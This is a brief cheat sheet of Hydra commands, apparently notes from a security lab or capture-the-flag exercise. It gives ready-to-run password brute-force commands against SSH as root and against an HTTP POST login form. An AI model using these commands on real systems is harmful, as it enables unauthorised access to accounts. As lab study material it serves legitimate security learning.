#hydra

SSH:
`hydra -l root -P passwords.txt 10.10.40.128 -t 4 ssh`

Post Web Form:
`sudo hydra <username> <wordlist> MACHINE_IP http-post-form "<path>:<login_credentials>:<invalid_response>"`

`hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V`